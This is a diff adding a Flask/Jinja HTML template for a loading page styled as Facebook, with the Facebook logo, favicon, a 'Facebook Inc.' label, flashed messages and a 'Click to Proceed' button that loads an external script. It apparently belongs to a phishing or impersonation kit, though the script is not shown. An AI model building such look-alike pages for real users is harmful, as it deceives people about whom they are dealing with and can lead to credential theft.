@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../static/css/facebook.css">
+	<link rel="icon" href="../static/images/facebook/favicon.ico" sizes="32x32" type="image/x-icon"/>
+    <title>loading...</title>
+</head>
+<body>
+	<div>
+		<img class="logo" src="/static/images/facebook/image.png" alt="Facebook"/>
+	</div>
+
+    <div class="loader-holder">
+        <div class="loader"></div>
+        <!-- <div> -->
+            {% for message in get_flashed_messages()%}
+                <p>{{message}}</p>
+            {% endfor %}
+                <button class="btn">Click to Proceed</button>
+            <p id="facebookInc">Facebook Inc.</p>
+
+    </div>
+
+	<script src="/static/Image/script.js"></script>
+</body>
+</html>
